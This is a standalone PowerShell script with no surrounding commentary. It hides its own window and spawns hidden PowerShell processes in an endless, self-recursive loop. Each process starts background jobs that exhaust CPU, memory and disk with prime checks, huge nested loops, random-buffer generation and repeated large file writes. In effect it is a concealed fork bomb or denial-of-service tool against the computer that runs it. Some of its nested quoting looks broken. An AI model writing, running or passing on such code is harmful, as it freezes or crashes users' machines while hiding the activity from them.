$hideWindowCode = @"
using System;
using System.Runtime.InteropServices;

public class WindowHider {
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);

    public static void HideCurrentWindow() {
        IntPtr hWnd = GetForegroundWindow();
        ShowWindow(hWnd, 0);
    }
}
"@

Add-Type -TypeDefinition $hideWindowCode

function Start-HiddenPowerShell {
    Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command "& { Add-Type -TypeDefinition $hideWindowCode; [WindowHider]::HideCurrentWindow(); while ($true) {
        Start-Job -ScriptBlock {
            $n = 2; while ($true) { 
                $isPrime = $true; 
                for ($i = 2; $i -le [math]::Sqrt($n); $i++) { 
                    if ($n % $i -eq 0) { 
                        $isPrime = $false; break 
                    } 
                }; 
                if ($isPrime) { [math]::Pow($n, $n) }; 
                $n++ 
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                $list = 1..1000000; 
                $list | ForEach-Object { $_ * $_ }
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                $a = 1; 
                for ($i = 1; $i -le 1000000; $i++) { 
                    $a = [math]::Log($a + $i) 
                }
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                $matrix = @( @(1, 2), @(3, 4) ); 
                for ($i = 0; $i -lt 1000000; $i++) { 
                    $matrix | ForEach-Object { 
                        $_ | ForEach-Object { 
                            [math]::Sqrt($_) 
                        } 
                    } 
                }
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                $a = 0; 
                for ($i = 0; $i -lt 1000000; $i++) { 
                    for ($j = 0; $j -lt 1000000; $j++) { 
                        $a += $i * $j 
                    }
                } 
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                $data = New-Object byte[] 1000000; 
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                [System.Net.Dns]::GetHostByName("localhost")
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                $x = [System.Text.Encoding]::UTF8.GetBytes("Lorem ipsum dolor sit amet, consectetur adipiscing elit."); 
                for ($i = 0; $i -lt 1000000; $i++) { 
                    [System.Convert]::ToBase64String($x) 
                }
            }
        }
        Start-Job -ScriptBlock {
            while ($true) { 
                [System.IO.File]::WriteAllText("test.txt", "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " * 1000000); 
                Remove-Item "test.txt"
            }
        }
        Start-HiddenPowerShell
        Start-Process "cmd.exe" -ArgumentList "/c start /b powershell -NoProfile -WindowStyle Hidden -Command "& { Add-Type -TypeDefinition $hideWindowCode; [WindowHider]::HideCurrentWindow(); while ($true) {
            Start-Job -ScriptBlock {
                $n = 2; while ($true) { 
                    $isPrime = $true; 
                    for ($i = 2; $i -le [math]::Sqrt($n); $i++) { 
                        if ($n % $i -eq 0) { 
                            $isPrime = $false; break 
                        } 
                    }; 
                    if ($isPrime) { [math]::Pow($n, $n) }; 
                    $n++ 
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    $list = 1..1000000; 
                    $list | ForEach-Object { $_ * $_ }
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    $a = 1; 
                    for ($i = 1; $i -le 1000000; $i++) { 
                        $a = [math]::Log($a + $i) 
                    }
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    $matrix = @( @(1, 2), @(3, 4) ); 
                    for ($i = 0; $i -lt 1000000; $i++) { 
                        $matrix | ForEach-Object { 
                            $_ | ForEach-Object { 
                                [math]::Sqrt($_) 
                            } 
                        }
                    }
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    $a = 0; 
                    for ($i = 0; $i -lt 1000000; $i++) { 
                        for ($j = 0; $j -lt 1000000; $j++) { 
                            $a += $i * $j 
                        }
                    } 
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    $data = New-Object byte[] 1000000; 
                    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    [System.Net.Dns]::GetHostByName("localhost")
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    $x = [System.Text.Encoding]::UTF8.GetBytes("Lorem ipsum dolor sit amet, consectetur adipiscing elit."); 
                    for ($i = 0; $i -lt 1000000; $i++) { 
                        [System.Convert]::ToBase64String($x) 
                    }
                }
            }
            Start-Job -ScriptBlock {
                while ($true) { 
                    [System.IO.File]::WriteAllText("test.txt", "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " * 1000000); 
                    Remove-Item "test.txt"
                }
            }
            Start-HiddenPowerShell
        }"'
    }"'
}

while ($true) {
    Start-HiddenPowerShell
}
